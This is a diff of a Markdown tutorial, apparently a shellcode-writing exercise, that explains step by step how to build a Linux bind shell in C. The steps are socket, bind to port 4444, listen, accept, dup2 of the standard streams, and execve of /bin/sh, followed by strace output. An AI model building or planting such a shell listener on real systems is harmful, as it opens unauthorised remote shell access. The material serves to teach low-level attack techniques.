@@ -76,6 +76,8 @@ int socket(int domain, int type, int protocol);
 ```  
 + For complete details see: `man socket`
 
+##### socket() parameters
+
 ```c
 int domain = AF_INET
 ```
@@ -103,51 +105,95 @@ struct in_addr {
   uint32_t       s_addr;     /* address in network byte order */
 }; 
 ```
-+ `sa_family_t sin_family  = AF_INET`   
-  - From Socket, we know that we will need to use the Address Family `AF_INET`  
-+ `in_port_t sin_port      = htons(4444)`  
-  - TCP Port 4444  
-  - The `htons()` function converts our decimal integer to 16-byte little-endian hex (aka "network byte order")  
-+ `struct in_addr sin_addr = htonl(INADDR_ANY)`   
-  - All interfaces.  
-  - The `htonl()` function converts our decimal integer to 32-byte little-endian hex.    
 + For complete details see: `man ip.7`  
+
+##### struct sockaddr\_in parameters
+
+```c
+sa_family_t sin_family  = AF_INET
+```
++ From Socket, we know that we will need to use the Address Family `AF_INET`  
+
+```c
+in_port_t sin_port      = htons(4444)
+```
++ TCP Port 4444  
++ The `htons()` function converts our decimal integer to 16-byte little-endian hex (aka "network byte order")  
+
+```c
+struct in_addr sin_addr = htonl(INADDR_ANY)
+```
++ All interfaces.  
++ The `htonl()` function converts our decimal integer to 32-byte little-endian hex.    
 
 #### 3. Bind the IP Socket Address to Socket. 
 ```c
 int bind(int sockfd, const struct sockaddr \*addr, socklen\_t addrlen);`
 ```
-  + `sockfd = ipv4Socket`  
-    - The socket file descriptor returned from `socket()` and saved as the variable `ipv4Socket`.  
-  + `const struct sockaddr *addr = &ipSocketAddr`  
-    - A pointer to the IP Socket Address structure `ipSocketAddr`.  
-  + `socklen_t addrlen = sizeof(ipSocketAddr)`  
-    - The byte length of our `ipSocketAddr` structure.  
-    - `sizeof()` returns the length in bytes of the variable.  
-  + For complete details see: `man bind`  
++ For complete details see: `man bind`  
+
+##### bind() parameters
+
+```c
+sockfd = ipv4Socket
+```
++ The socket file descriptor returned from `socket()` and saved as the variable `ipv4Socket`.  
+
+```c
+const struct sockaddr *addr = &ipSocketAddr
+```
++ A pointer to the IP Socket Address structure `ipSocketAddr`.  
+
+```c
+socklen_t addrlen = sizeof(ipSocketAddr)
+```
++ The byte length of our `ipSocketAddr` structure.  
++ `sizeof()` returns the length in bytes of the variable.  
 
 #### 4. Listen for connections to the TCP Socket at the IP Socket Address.  
 ```c
 int listen(int sockfd, int backlog);
 ```  
-  + `int sockfd  = ipv4Socket`  
-  + `int backlog = 0`   
-    - This is for handling multiple connections.   
-    - We only need to handle one connection at a time, therefor we will set this value to `0`.   
-  + For complete details see: `man listen`  
++ For complete details see: `man listen`  
+
+##### listen() Parameters
+
+```c
+int sockfd  = ipv4Socket
+```
+
+```c
+int backlog = 0
+```
++ This is for handling multiple connections.   
++ We only need to handle one connection at a time, therefor we will set this value to `0`.   
 
 #### 5. Accept connections to the TCP-IP Socket and create a Client Socket.  
 ```c
 int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
 ```  
-  + `int sockfd = ipv4Socket`  
-  + `struct sockaddr *addr = NULL`  
-    - This structure is filled in with the address of the peer socket.  
-  + `socklen_t *addrlen = NULL`  
-    - When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.  
-  + `int flags  = NULL`  
-  + The function will return the new Socket File-Descriptor. Save as `clientSocket`  
-  + For complete details see: `man accept`  
++ For complete details see: `man accept`  
+
+##### accept() parameters
+
+```c
+int sockfd = ipv4Socket
+```
+
+```c
+struct sockaddr *addr = NULL
+```
+- This structure is filled in with the address of the peer socket.  
+
+```c
+socklen_t *addrlen = NULL
+```
+- When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.  
+
+```c
+int flags  = NULL
+```
++ The function will return the new Socket File-Descriptor. Save as `clientSocket`  
 
 #### 6. Transfer Standard-Input, Standard-Output, and Standard-Error to the client socket.  
 ```c
@@ -156,25 +202,37 @@ dup2(clientSocket, 0); // STDIN
 dup2(clientSocket, 1); // STDOUT
 dup2(clientSocket, 2); // STDERR
 ```   
-  + For complete details see: `man dup2`  
++ For complete details see: `man dup2`  
 
 #### 7. Spawn a `/bin/sh` shell for the client, in the connected session.  
 ```c
 int execve(const char *pathname, char *const argv[], char *const envp[]);
 execve("/bin/sh", NULL, NULL);
 ```  
-  + `const char *pathname = "/bin/sh"`  
-  + `char *const argv[] = NULL`  
-  + `char *const envp[] = NULL`  
-  + For complete details see: `man execve`  
++ For complete details see: `man execve`  
+
+##### execve() parameters
+```c
+const char *pathname = "/bin/sh"
+```
+
+```c
+char *const argv[] = NULL`  
+```
+
+```c
+char *const envp[] = NULL`  
+```
 
 ### Trace System-Calls  
-+ Use `strace` to see system calls as the `shellcode` executes.  
+Use `strace` to see system calls as the `shellcode` executes.  
+
 ```bash 
 root# strace ./bindshell
 socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
 ```  
 + We see that the `Socket File-Descriptor` for our socket.
+
 ```bash
 bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
 listen(3, 0)                            = 0
